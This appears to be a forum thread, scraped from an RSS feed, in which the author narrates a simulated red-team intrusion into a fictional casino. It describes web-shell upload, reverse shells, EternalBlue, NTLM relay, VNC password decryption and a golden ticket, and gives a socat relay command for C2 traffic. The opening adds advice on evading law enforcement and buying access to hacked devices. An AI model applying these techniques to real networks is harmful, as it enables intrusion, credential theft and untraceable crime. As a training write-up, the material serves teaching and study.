I’ve downloaded the file for analysis and just viewed a report on the Casino’s winnings since the files are within the docker you need to copy them locally [8]

![|624x308](https://mydmcxblue.files.wordpress.com/2024/05/image-225.png?w=624)

Since the file was contained in a docker I have to copy[5] the file from it into my local station, take some time to explore the environment you would be surprised on the stuff you would find passwords, keys, databases, PII the list goes on and on tools like Empire, some C# other’s in PowerShell, Nim, Go the possibilities are endless give them a try and look for yourself you might find quick wins, *COUGH* “Passwords.xlsx” *COUGH*

[1] https://www.netexec.wiki/

[2] https://twitter.com/_xpn_

[3] https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#adam-chester-patch

[4] https://github.com/RythmStick/AMSITrigger

[5] https://github.com/BC-SECURITY/Malleable-C2-Profiles/blob/master/Normal/gmail.profile

[6] https://github.com/Tylous/SourcePoint

[7] https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/

[8] https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host

—-[Enumeration]—————————————————————————————————————

I need to locate my next host and potential access to it, since staying locally is no longer necessary as I am Administrator Privileges from the SHH connection we can start looking for potential AD attacks such as Unconstrained Delegation, Constrained Delegation, Kerberoasting, AS-REPRoasting, Shadow Credentials, Active Directory Certificate Services and others but my enumeration actually didn’t point me anything crazy as such I did locate AS-REP but it was for a user I already hold with access to nowhere else now port scans are rare on internal networks specially since they tend to be very noisy, but sometimes with a little bit of creativity and time we can actually gather good information as I did previously using nmap via proxychains but now I don’t need that amount of info yet and Empire has a built in port-scanner in PowerShell running the module shows me interesting output.

![|410x156](https://mydmcxblue.files.wordpress.com/2024/05/image-226.png?w=410)

Having the open port information lets me apply a targeted scan to wat information I want to gather this way I am not guessing and trying multiple ports at a time and only focusing my information gathering at the openly available ones in this case port 80 and 445 are the most interesting ones, I’ve utilized the same methods as previously with nmap to avoid detection.

![|624x478](https://mydmcxblue.files.wordpress.com/2024/05/image-227.png?w=624)

The HTTP protocol and the well known port 445 SMB running on a Windows 7 machine potentially vulnerable to the Eternablue[1] exploit are the interesting ones I’ll take the approach at looking at port 80 but remember the port isn’t open to the internet so setting up a reverse proxy onto the Browser should be a potential next step this time I will setup a Local Port forward with SSH since I know the target server and the port I am trying to reach I can tell SSH to do that with the “-L” flag:

![|624x31](https://mydmcxblue.files.wordpress.com/2024/05/image-228.png?w=624)

Now I can reach the HTTP server from my local machine as the request will be forwarded to this location, my next step is to utilize a directory brute force technique I am aware the service is running on Microsoft IIS but I only know the existence of the main page, these tend to contain a directory only known to the internal employees but the “vulnerability” here is that these directories tend to have common or well-known names such for example: secret, uploads, admin, configuration and so on. A tool popular for this well-known technique is feroxbuster [2] a popular directory tool written in Rust, it has tons of great features but will be focusing on a few ones that I know won’t crash the server and gives us sufficient information to look for:

![|624x64](https://mydmcxblue.files.wordpress.com/2024/05/image-229.png?w=624)

```
----[FeroxBuster]-------------------------------------------------------------------

--depth 1: This tells feroxbuster to only go 1 level deep in the directory scanning

--auto-bail: If feroxbuster encounters multiple errors then stop

--silent: I don&#39;t want all the output just the directories found

-x: The extensions I want to apply to the words in the wordlist, experience and some documentation will allow you to recognize the type of file types accepted on the HTTP Service running

-A: Use a random user Agent when scanning to avoid some detection

-w: The wordlist I want to use in the directory scanning

----[FeroxBuster]----------------------------------------------------------------
```

The previous output shows me that an uploads and uploads.html directory have been found one is empty but the other one actually gives me the option to upload files, now the trick here is to utilize a compatible web shell to run on a window workstation since we are aware ASPX files are utilized we can actually take advantage of this language usually Linux distros that are for pentesting or offensive development contain some great examples to utilize for web shells but these can be found on the internet as well just be careful for backdoors as you don’t want to hack yourself

![|389x99](https://mydmcxblue.files.wordpress.com/2024/05/image-230.png?w=389)

Let’s try uploading our payload, now that we have the directory to upload and the directory where the uploads go to, we can interact with our uploaded payload.

![|624x286](https://mydmcxblue.files.wordpress.com/2024/05/image-231.png?w=624)

I’ve uploaded an aspx file webshell.

![|527x328](https://mydmcxblue.files.wordpress.com/2024/05/image-232.png?w=527)

Visiting the payload directly I can interact with the webshell which gives me a prompt for code execution.

![|624x485](https://mydmcxblue.files.wordpress.com/2024/05/image-233.png?w=624)

Now I’ll upgrade to an Empire agent to utilize the tools built within again and keep my enumeration running, but I do have to be creative and fix some formatting with my agent since I was receiving errors when executing the PowerShell command from Empire, once I get an agent calling back, I see the current user being DefaultAppPool

![|624x67](https://mydmcxblue.files.wordpress.com/2024/05/image-234.png?w=624)

Sometimes you will encounter some issues since the host is running Windows 7 host or older generations of Windows mostly C2’s in this age focus on Windows 10 and above so they tend to have a little more trouble with targeting these systems, but they still exist!! Not as quite as popular in the day but believe me as small as 2% I’ve encounter these systems myself don’t focus to much, but give them a little research you’d be surprised the area of possibilities in operating systems like these so mix your technique catch shells with ncat or maybe use well know tools such as Metasploit this one has been available since 2003 so they’ve had some work done with the generations of windows when they started.

![|624x429](https://mydmcxblue.files.wordpress.com/2024/05/image-235.png?w=624)

I’ve used a little bit of creativity and testing when using a PowerShell reverse shell used for Version 5.0 and above, some character escaping and encoding are quite helpful in this scenario as some modules and functions didn’t exist until later versions of PowerShell this is just a neat little example for a basic reverse shell, don’t!!! But it’s still there just in case, but don’t, since the communication is simple TCP with no encryption.

![|624x173](https://mydmcxblue.files.wordpress.com/2024/05/image-236.png?w=624)

—-[Extra, Extra!!: Exploitation]———————————————————————————————

I want to demonstrate an alternative to the WebApp option for lateral movement in our nmap scan we also encountered that port 445 was available for exploration if we take a better look you can tell that it’s running on Windows 7 Service Pack 1 vulnerable to EternalBlue Exploit there are multiple ways to approach this technique we can utilize Metasploit[6], or directly from Empire we can also take a look at open source projects that utilize this exploit for giving us a reverse shell but do be careful of what you are running from the internet there are some jokesters out there giving out fake exploits, trolls or actually backdoor to your attacking machine, things to consider when running Open Source tooling, is building a reputation[7] where we know this isn’t malicious it’s quite hard so just an idea.
In my first method I’ll use Metasploit for it take a look at the following screenshot noticing the options available for the exploit

![|624x277](https://mydmcxblue.files.wordpress.com/2024/05/image-237.png?w=624)

I’ve added all the required values to the exploitation module now when I execute, I will be catching a reverse shell via ncat since the shellcode is simply using an msfvenom shellcode, proceeding with executing the module from Empire building the shellcode with msfvenom is quite simple.

![|624x177](https://mydmcxblue.files.wordpress.com/2024/05/image-238.png?w=624)

Now all we need to do is place the shellcode that’s between the curly brackets onto the value “Shellcode” in Empire, when executing this module, I will receive a callback onto my ncat listener

![|624x265](https://mydmcxblue.files.wordpress.com/2024/05/image-239.png?w=624)

The previous screenshots demonstrates the successful exploit and capturing of a reverse shell connection, since the setup used here was an ncat shell, play around to capture maybe on a different C2 or straight from Empire but since it’s tricky working from a Docker I stopped here but I do recommend giving this method a try, in my case I’ve encountered errors I won’t even bother since the OS is not on the supported list of Empire maybe giving it a try with Kali Linux should work

![|624x132](https://mydmcxblue.files.wordpress.com/2024/05/image-240.png?w=624)

—-[End Exploitation]———————————————————————————————————–

From here I can start enumerating when I looked at potential privilege escalation techniques or lateral movement techniques as well as credential access techniques, an interesting location to look at is the scheduled tasks location.

![|624x116](https://mydmcxblue.files.wordpress.com/2024/05/image-241.png?w=624)

With windows 7, 8, 10, 11 the Task information has slightly changed here we can actually locate an XML file in the System32 folder, but in later versions I have to locate the Task information via Registry Keys, luckily for me in Windows 7 the XML file exists.

![|593x120](https://mydmcxblue.files.wordpress.com/2024/05/image-242.png?w=593)

Reading that file I can see that the mgarcia user is trying to run a ps1 file, so I have some options to elevate my privileges to manipulate the scheduled task, read the ps1 file and hope for credentials or replace it, grab credentials from the scheduled task or capture hashes since I see no credentials on the task itself and the file has no hard-coded credentials since it is running in the context of mgarcia which I will assume the it is using NetNTLMv2[3] for authentication I can probably elevate my privileges using the HotPotato[4] technique or it’s other variants or maybe try and capture the hashes, but since I am aware that all the passwords are complicated passwords that would take time in cracking I will apply the NTLM Relay[5] technique in summary.

I will respond to the NetNTLM request, but I won’t be capturing the hashes instead I will use ntlmrelay to relay or send the hashes to another workstation where the user is an Administrator and with that I can gain command execution and keep moving forward

![|624x235](https://mydmcxblue.files.wordpress.com/2024/05/image-243.png?w=624)

In the screenshot above I told ntlmrelay to target the 10.10.1.138 IP which I know it’s the next workstation, we can actually pass it a list of IPs but beware of SMB Signing[5] this has to be disabled, since the function tells if someone has changed a message during transmission, then the hashes won’t match, and SMB will know that someone tampered with the data. The signature also confirms the sender’s and receiver’s identities.

A good tool for testing this is via netexec.

![|624x124](https://mydmcxblue.files.wordpress.com/2024/05/image-244.png?w=624)

I now utilized the relay technique to execute a PowerShell Empire agent on the targeted workstation.

![|624x235](https://mydmcxblue.files.wordpress.com/2024/05/image-245.png?w=624)

I can now interact with the new agent.

![|624x182](https://mydmcxblue.files.wordpress.com/2024/05/image-246.png?w=624)

Now with the final workstation compromised I have access to everything, right? not really I don’t have DA and the current user isn’t even a user it’s a workstation account (SYSTEM) now for the final goal I have to reach the DC (Domain Controller) I’ll did a quick nmap scan to check what are my possibilities to move onto the next workstation

![|624x436](https://mydmcxblue.files.wordpress.com/2024/05/image-247.png?w=624)

A little more detailed port scan on the VNC ports

![|624x308](https://mydmcxblue.files.wordpress.com/2024/05/image-248.png?w=624)

Now TightVNC[7] holds the password in the Registry Keys, since we have SYSTEM level access we can read the Keys and find the values of those keys since VNC is enabled on this workstation and the Domain Controller

![|624x114](https://mydmcxblue.files.wordpress.com/2024/05/image-249.png?w=624)

Now VNC uses a hard-coded DES key to store credentials. The same key is used across multiple product lines. To decrypt this, we can actually use a Linux One Liner

![|624x89](https://mydmcxblue.files.wordpress.com/2024/05/image-251.png?w=624)

I can utilize a RealVNC[8] Viewer client via the proxy, but I do recommend utilizing the same applications as the environment just in case any new signatures that don’t belong are left on the network connection.

![|624x418](https://mydmcxblue.files.wordpress.com/2024/05/image-252.png?w=624)

Now I could dump hashes in the Domain but we wan to be quite remember!! So instead of dumping all the NTLM hashes available in the DC I’ll just grab myself a Golden Ticket for my persistence for that I will grab the AES hash of KRBTGT.

![|624x122](https://mydmcxblue.files.wordpress.com/2024/05/image-253.png?w=624)

And now I can use Rubeus to create a Golden Ticket [10]

![|624x293](https://mydmcxblue.files.wordpress.com/2024/05/image-254.png?w=624)

Rubeus will output a Base64 encoded ticket which we can pass onto our current session and enumerate the Domain Controller

![|624x455](https://mydmcxblue.files.wordpress.com/2024/05/image-255.png?w=624)

And with that we have gain complete Domain Dominance over the network at Tropicana Royale Casino, we gained Initial Access via Exploiting a public application used on a “IOT” Device which contained an RCE exploit, enumerated the Active Directory in a Linux OS environment, bypassed security products understanding it at a high-level our detection&#39;s on the “why” and some of the “how” utilized a C2 framework inside a Docker container, setup python virtual environments for our tools, persistence via stolen SSH Keys, Lateral Movement with Web Application exploitation, Internal Running Services exploitation to run custom shellcode (EternalBlue), NTLM Relay, found interesting files, some advice on Malleable profiles, protocols used in an AD, Proxies, Golden Tickets for Persistence and other techniques.

Well thanks for following me in this little Adventure. Hopefully it was entertaining and gave you some insight on my POV in hacking and Red Team and of course some small red team knowledge. Now go and Rob Casinos!!!!

*Legally…*

[1] https://en.wikipedia.org/wiki/EternalBlue

[2] https://github.com/epi052/feroxbuster

[3] https://en.wikipedia.org/wiki/NTLM

[4] https://foxglovesecurity.com/2016/01/16/hot-potato/

[5] https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing

[6] https://www.metasploit.com/

[7] https://www.wired.com/story/jia-tan-xz-backdoor/

[8] https://notes.offsec-journey.com/enumeration/vnc

[9] https://www.realvnc.com/

[10] https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/</description>
    
    <lastBuildDate>Mon, 20 May 2024 13:31:22 +0000</lastBuildDate>
    <category>Red-Team</category>
    <atom:link href="https://0x00sec.org/t/how-to-rob-a-casino/40556.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>How To Rob a Casino</title>
        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
        <description><![CDATA[
            <p>Thank you that was my intended format but I wanted the screenshots as well, lol</p>
          <p><a href="https://0x00sec.org/t/how-to-rob-a-casino/40556/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-rob-a-casino/40556/5</link>
        <pubDate>Mon, 20 May 2024 13:31:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-40556-5</guid>
        <source url="https://0x00sec.org/t/how-to-rob-a-casino/40556.rss">How To Rob a Casino</source>
      </item>
      <item>
        <title>How To Rob a Casino</title>
        <dc:creator><![CDATA[0xf00I]]></dc:creator>
        <description><![CDATA[
            <p>Great post! I love the format and the style. It reminds me of those old .txt papers. Cool stuff—keep it up!</p>
          <p><a href="https://0x00sec.org/t/how-to-rob-a-casino/40556/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-rob-a-casino/40556/4</link>
        <pubDate>Fri, 17 May 2024 09:57:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-40556-4</guid>
        <source url="https://0x00sec.org/t/how-to-rob-a-casino/40556.rss">How To Rob a Casino</source>
      </item>
      <item>
        <title>How To Rob a Casino</title>
        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
        <description><![CDATA[
            <p>Thank you, much appreciated!!</p>
          <p><a href="https://0x00sec.org/t/how-to-rob-a-casino/40556/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-rob-a-casino/40556/3</link>
        <pubDate>Thu, 16 May 2024 17:07:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-40556-3</guid>
        <source url="https://0x00sec.org/t/how-to-rob-a-casino/40556.rss">How To Rob a Casino</source>
      </item>
      <item>
        <title>How To Rob a Casino</title>
        <dc:creator><![CDATA[messede]]></dc:creator>
        <description><![CDATA[
            <p>kudos, this is a really nice format to explain a lot of the tools and techniques, i loved the  fictional angle that you applied to the regular ctf writeup style , this was really fun read.</p>
          <p><a href="https://0x00sec.org/t/how-to-rob-a-casino/40556/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-rob-a-casino/40556/2</link>
        <pubDate>Thu, 16 May 2024 16:04:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-40556-2</guid>
        <source url="https://0x00sec.org/t/how-to-rob-a-casino/40556.rss">How To Rob a Casino</source>
      </item>
      <item>
        <title>How To Rob a Casino</title>
        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
        <description><![CDATA[
            <p>Casinos, some view these places as something that corrupts the soul, leading individuals astray with the allure of easy money and instant gratification. Others see casinos as an escape from reality, seeking temporary relief from stress, boredom or dissatisfaction and for others it represents hope, offering the possibility of a better life through luck or skill.</p>
<p>But hackers?</p>
<p>An opportunity, a challenge, a game. Here we go again gentlemen Tropicana is back but this time besides the fact of saving your money, now it’s taking it as a gamble. This inspiration of a blog comes again from the Hacker Manifesto from Phineas Phisher [1] “bad guys”, the law, the “system” all trying to capture the “bad guy” who is stealing our money but is the bank here to protect us??[2].</p>
<p>But let’s forget about that, were here to Rob a casino, but ……. How do we do it? I’m no expert but I can recreate scenarios where it happened, replicate, and demonstrate some ideas on what tactics or techniques may or may not be used. Remember in the previous blog how we mentioned “Teach a man how to Phish” well it’s funny how the fish will be somewhat be involved [3].</p>
<p>Now I always try to demonstrate examples where people can have access and learn via Open Source tooling, in the last post on “How to Rob a Bank”[4] we worked with the Havoc[5] framework and amazing open source C2 that was built by a teenager trying to learn malware and that was working on it for 2 years before releasing it to us mortals. Please as mentioned previously don’t take this as a “Guide” a “How To” or a “Manual” because the infrastructures related to Casino’s, Banks, Treasury it’s quite different and here it’s just a simulation or is it?!?![6].</p>
<p>[1] <a href="https://unicornriot.ninja/wp-content/uploads/2019/11/hackback-announce-text.txt" rel="noopener nofollow ugc">https://unicornriot.ninja/wp-content/uploads/2019/11/hackback-announce-text.txt</a></p>
<p>[2] <a href="https://www.nytimes.com/2022/03/06/business/payments-fraud-zelle-banks.html" rel="noopener nofollow ugc">https://www.nytimes.com/2022/03/06/business/payments-fraud-zelle-banks.html</a></p>
<p>[3] <a href="https://www.washingtonpost.com/news/innovations/wp/2017/07/21/how-a-fish-tank-helped-hack-a-casino/" rel="noopener nofollow ugc">https://www.washingtonpost.com/news/innovations/wp/2017/07/21/how-a-fish-tank-helped-hack-a-casino/</a></p>
<p>[4] <a href="https://0x00sec.org/t/how-to-rob-a-bank/37022" class="inline-onebox">How To Rob a Bank</a></p>
<p>[5] <a href="https://github.com/HavocFramework/Havoc" class="inline-onebox" rel="noopener nofollow ugc">GitHub - HavocFramework/Havoc: The Havoc Framework.</a></p>
<p>[6] <a href="https://www.youtube.com/watch?v=t-Nz6us7DUA" rel="noopener nofollow ugc">Morpheus explains what is real</a></p>
<p>—-[ Preparation ]———————————————————————————————————–</p>
<p><em>“Give me six hours to chop down a tree and I will spend the first four sharpening the axe.”</em></p>
<p>Building the infrastructure is an important part of handling your security, OPSEC and post-exploitation techniques that you will be working on once inside the network.</p>
<p>Security, staying safe on the internet is of upmost importance if you are going to hack a Casino right? I mean if the feds are knocking at your door that means you did something wrong already, but we don’t need to worry as we have some small tips for a strong infrastructure.</p>
<p><em><strong>VPN</strong></em></p>
<p>VPNs have some popularity that has been known to hackers already[1][2][3] in a bad or good way about these products, so do whatever you want with this information, now that we have the “PARENT” of all proxies and VPNs, we can consider the Tor Network but it also comes with some controversial problems [4][5] uncle Sam is always peeping and they can be creative as well.</p>
<p>But with all these things going on what can we do???</p>
<p>Piggyback onto another Wi-Fi maybe build a cantenna [6] and grab that Wi-Fi from a mile away or buy some remote access into already hacked devices and do your deeds there? But remember IP Logs! I am aware of proxies, but I am not familiar with how good they can be.</p>
<p>But here are some VPN that claim they don’t keep logs; these are suggestions as one would say just consider them and do some due diligence with your research.</p>
<p><em><strong>Virtualization and Encryption</strong></em></p>
<p>Run everything from a virtual machine there are multiple services available VMWare, VirtualBox, QEMU, Hypervisor [7][8][9][10] I’ve delved into this topic previously but still a good reminder, some of these VMs come with the ability to encrypt the Disks but there is no harm in manually applying another layer inside the VM.</p>
<p>[1] <a href="https://www.zdnet.com/article/cyberstalker-thwarted-by-vpn-logs-gets-17-years-in-prison/" rel="noopener nofollow ugc">https://www.zdnet.com/article/cyberstalker-thwarted-by-vpn-logs-gets-17-years-in-prison/</a></p>
<p>[2] <a href="https://surfshark.com/blog/can-police-track-vpn" rel="noopener nofollow ugc">https://surfshark.com/blog/can-police-track-vpn</a></p>
<p>[3] <a href="https://www.theregister.com/2011/09/26/hidemyass_lulzsec_controversy/" class="inline-onebox" rel="noopener nofollow ugc">HideMyAss defends role in LulzSec hack arrest • The Register</a></p>
<p>[4] <a href="https://gizmodo.com/fbi-tor-ip-address-muhammed-momtaz-al-azhari-isis-1849975153" class="inline-onebox" rel="noopener nofollow ugc">How Did the FBI Get Muhammed Al-Azhari's IP Address From Tor?</a></p>
<p>[5] <a href="https://www.linkedin.com/pulse/fbi-can-track-locate-suspects-using-tor-still-secure-julian-wendt/" class="inline-onebox" rel="noopener nofollow ugc">FBI Can Track and Locate Suspects Using TOR. Is TOR Still Secure?</a></p>
<p>[6] <a href="https://www.instructables.com/DIY-Wifi-Extender-Cantenna-build-with-a-stand/" rel="noopener nofollow ugc">https://www.instructables.com/DIY-Wifi-Extender-Cantenna-build-with-a-stand/</a></p>
<p>[7] <a href="https://www.vmware.com/" rel="noopener nofollow ugc">https://www.vmware.com/</a></p>
<p>[8] <a href="https://www.virtualbox.org/" rel="noopener nofollow ugc">https://www.virtualbox.org/</a></p>
<p>[9] <a href="https://www.qemu.org/download/" class="inline-onebox" rel="noopener nofollow ugc">Download QEMU - QEMU</a></p>
<p>[10] <a href="https://medium.com/@liam.cafearo/setting-up-hyper-v-and-a-kali-linux-virtual-machine-1a76bb4fa0f" class="inline-onebox" rel="noopener nofollow ugc">Setting up Hyper-V and a Kali Linux Virtual Machine | by Liam Cafearo | Medium</a></p>
<p>—-[ Infrastructure ]————————————————————————————————————-</p>
<p>You managed to hide your tracks and think that you are in the clear that Big Brother is no longer watching your tracks, good!! But you need to build your infrastructure now, our server, redirectors and strong OPSEC so they don’t find you. Here are some “Tips and Tricks” to be careful.</p>
<p>The C2 Server</p>
<p>In this example will be using the Empire [1] C2 Framework, I know in the previous one I was working with Havoc, and as much of a fan I am I want to demonstrate that there is no “right” way of thinking don’t learn about the tool, learn about the technique that the tool takes advantage of. Maybe mimikatz for example grabs credentials from the LSASS process but is that it?! Is that the only place where there are passwords? Not really, Cookies, Files, Browsers they all contain that loot we are looking for, so that’s why I am working in using another C2 for this article, blog, whatever it’s considered to be.</p>
<p><em>“To understand the technique.”</em></p>
<p>I don’t want to get much into detail for installing and running empire but if you follow the wiki setup should be simple to install using an officially supported OS but in my case, I will be using a Docker[2] as Empire has no official support for BlackArchLinux, Dockers are a great way for temporary use, they can be created and destroyed in a breeze, when setting up your C2 we have to change it up a little, Ports, Headers, Obfuscation, the default settings are great but they are also well known, leave a new fingerprint every time you work these tools have been updated and modernized to use the latest techniques leaving stuff with the default settings nowadays is a great way to get you caught.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-153.png?w=624" alt="" width="624" height="458" role="presentation"></p>
<p>Now we can’t just have our server facing the internet in default values you’ll get caught!![3] first will need some similar domains to the target as we are trying to blend in with our network traffic, to make sure it doesn’t look suspicious when we are moving inside the network or if we ever do phishing we will try to look the least suspicious as possible, C2s allow us to use something called Malleable[4] profiles to blend our traffic when our agent, beacon, demon calls back to us the traffic it uses is similar to common malicious connections so we have to make it look legitimate not simple connections where our commands and output can be easy to read from, a step into blending our traffic is finding legitimate expired domains[5] that we can use on our HTTP traffic.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-154.png?w=423" alt="" width="423" height="231" role="presentation"></p>
<p>These examples were available to purchase maybe previous owners just didn’t have the need to continue with the domain. These domains are a good approach as Domain Categorization where AV/EDR or network product categorizes [6] a Domain to understand what’s it doing and what’s it meant for, so this is already done for you, but the process of aging still has to be looked on since registrations are shown as recent they were even if they are expired domains.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-155.png?w=537" alt="" width="537" height="141" role="presentation"></p>
<p>Now that the domains are set for mixing our net traffic will need some relays, these work in the benefit of pointing our implants away from our server, if our server gets burned, we need to build it again and we don’t want to start all over again. Setting up relays is quite simple utilizing socat [7] with the following command:</p>
<pre><code class="lang-auto">socat -v TCP-LISTEN:4444,fork TCP:C2SERVER:4444
</code></pre>
<p>We listen on Port 4444 and relay all traffic to our server on the same port. We will verify this by setting up Wireshark to ensure our payload calls the relay instead of the real server. This way, if IP blocking is in place, our relay server will be flagged instead of our C2 server, and setting up a new relay is way faster than a new server.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-156.png?w=624" alt="" width="624" height="338" role="presentation"></p>
<p>This is a simple redirector. There are legitimate services that can relay our connections and be more OPSEC about it [8][9][10]?? It’s just about being creative in this example all I am doing is just forwarding the TCP connections to my server.</p>
<p>You can notice on the screenshot that Wireshark only sees the IP Relay as the Destination but can’t see beyond that, so the server stays safe from prying eyes. Let’s add more layers of evasion into our infrastructure, another service for applying more security is Apache [11], Apache contains methods to Block IPs, allow only certain requests that contain certain values to have access onto our C2 Server.</p>
<p>—-[ Blocking IPs]—————————————————————————————————————-</p>
<p>Pretty simple locate your configuration file in the  and place the IP or IP Range that you’d like to block.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-157.png?w=247" alt="" width="247" height="104" role="presentation"></p>
<p>If I try to access the resource I get denied</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-158.png?w=624" alt="" width="624" height="143" role="presentation"></p>
<p>—-[ Custom Headers]———————————————————————————————————–</p>
<p>Now let’s remove it and try with specific values, let’s say Apache will only grant you access if there’s a specific Header in your request and if it doesn’t exist then it won’t allow you.</p>
<p>We will need to enable some modules that have been commented out:</p>
<p>LoadModule rewrite_module modules/mod_rewrite.so</p>
<p>LoadModule headers_module modules/mod_headers.so</p>
<p>From here will edit the  tag again placing the following values</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-159.png?w=486" alt="" width="486" height="144" role="presentation"></p>
<p>Requesting again to access the server with the specified Header will be the only way to gain access.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-160.png?w=624" alt="" width="624" height="380" role="presentation"></p>
<p>Apache has numerous options and security layers that can be added to their configuration play around and check ideas on what can you do to strengthen your infrastructure.</p>
<p>[1] <a href="https://github.com/EmpireProject/Empire" class="inline-onebox" rel="noopener nofollow ugc">GitHub - EmpireProject/Empire: Empire is a PowerShell and Python post-exploitation agent.</a></p>
<p>[2] <a href="https://bc-security.gitbook.io/empire-wiki/quickstart/installation#docker" class="inline-onebox" rel="noopener nofollow ugc">Installation | Empire Wiki</a></p>
<p>[3] <a href="https://twitter.com/MichalKoczwara/status/1657090134129401866" rel="noopener nofollow ugc">https://twitter.com/MichalKoczwara/status/1657090134129401866</a></p>
<p>[4] <a href="https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/" class="inline-onebox" rel="noopener nofollow ugc">How the Malleable C2 Profile Makes Cobalt Strike Difficult to Detect</a></p>
<p>[5] <a href="https://www.expireddomains.net/" rel="noopener nofollow ugc">https://www.expireddomains.net/</a></p>
<p>[6] <a href="https://urlfiltering.paloaltonetworks.com/query/" class="inline-onebox" rel="noopener nofollow ugc">Palo Alto Networks URL filtering - Test A Site</a></p>
<p>[7] <a href="https://linux.die.net/man/1/socat" rel="noopener nofollow ugc">https://linux.die.net/man/1/socat</a></p>
<p>[8] <a href="https://0xdarkvortex.dev/c2-infra-on-azure/" class="inline-onebox" rel="noopener nofollow ugc">A Thousand Sails, One Harbor - C2 Infra on Azure</a></p>
<p>[9] <a href="https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/" rel="noopener nofollow ugc">https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/</a></p>
<p>[10] <a href="https://medium.com/trainingdock/http-redirects-with-lambda-c20cf7934060" class="inline-onebox" rel="noopener nofollow ugc">HTTP Redirects with Lambda. In this recipe, we cover: | by fkaz | TrainingDock | Medium</a></p>
<p>[11] <a href="https://httpd.apache.org/" rel="noopener nofollow ugc">https://httpd.apache.org/</a></p>
<p>—-[ Recon ]———————————————————————————————————————–</p>
<p>Now recon has been the golden step for Red Teamers, Penetration Testers, APTs, Doctors, Scientists, you name it, this step is crucial for moving forward it helps you decide on what needs to be done next, the informed decisions you can take once you are on the network, maybe you don’t need to Privilege Escalate if your current users have the required permissions maybe Initial Access is our target but the information gathered on the version of Office that they are working with 2013, 2016, o365??. These files can hold valueable information that we can utilize for our External or Internal Enumeration, they contain tons of valueable data some of that data is called Metadata [1] looking at a file grabbed from the Casino’s website for a Job Posting demonstrates the user who created this file below.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-161.png?w=561" alt="" width="561" height="189" role="presentation"></p>
<p>This information comes in handy when we are weaponizing our payloads to send to our target this method can be used if we were applying a password spraying technique or targeting specific users on the enterprise to avoid the issues of Spam make more rational and targeted phishing campaigns, as mentioned in the previous post “How to Rob a Bank, but in this scenario there is no need for Phishing since we found an IOT[2] (Internet Of Things) connected to the Internet, here will look at some resources to find some data that we can utilize when Enumerating externally.</p>
<p>What I like to do with this info now that I have a full name, sometimes you will get an internal username instead of a name like this one, but if that is not the case utilizing namemash.py [3] is a great method to build usernames to find the naming convention used internally</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-162.png?w=624" alt="" width="624" height="262" role="presentation"></p>
<p>We can avoid scanning ports and services by checking out other places that did this for us. For example, Shodan [4] a popular “HACKER” search engine, and well known for scanning the internet for open ports on IOTs, Shodan has an incredible API that we can utilize in the Command-Line Interface here is an example of finding information about hosts, such as IP, HOSTNAME, PORT AND SERVCE</p>
<pre><code class="lang-auto">shodan search --fields ip_str,port,org,hostnames "Golden FTP"
</code></pre>
<p>The results of this scan are quite impressive but hidden as I don’t want to show vulnerable or potential targets but in seen below, I’ve targeted port 21 to be specific where I know the FTP protocol and services are running a potential initial access vector since it can give me RCE or even anonymous file access.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-163.png?w=624" alt="" width="624" height="387" role="presentation"></p>
<p>Now that we have located potential targets, we can now request a scan on the target we are interested in and gather a more detailed view on the information we are looking at.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-164.png?w=546" alt="" width="546" height="252" role="presentation"></p>
<p>I do recommend verifying the Data manually if you can, since Shodan scans are just snapshots of when Shodan did the scan itself, once you proceed verifying this info yourself then it might yield you different results.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-165.png?w=624" alt="" width="624" height="174" role="presentation"></p>
<p>Now I’ll be using some open source tooling built in the python language, I do recommend when working with Python tools to create a virtual environment this way you don’t break none of the other dependencies on your system and it’s a cleaner way to have an environment you can remove at any time, now I did not use this in the Shodan example because the tool was already pre-installed but a recommendation just in case you need to use something from GitHub</p>
<pre><code class="lang-auto">python3 -m venv python-environment

To access or start your virtual environment you would need the source command.

source python-environment/bin/activate
</code></pre>
<p>Now with that you will notice a new location set on your terminal path along with the username and hostname when this is all set and done, installing old or new python tools has been simplified with the safety of not forcing or breaking packages form your OS.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-166.png?w=579" alt="" width="579" height="63" role="presentation"></p>
<p>I can run and install Spadefoot[5] without any issues inside the environment it would open a web page with the interface and options to start scanning our target be it a webpage or IP Address it’s a powerful tool for reconnaissance with options ranging in the passive to active scanning it will dive as deep as you allow it to for finding any valueable data related to our target the scanning is time consuming so research and look for other places while this is done and come back to at a later time</p>
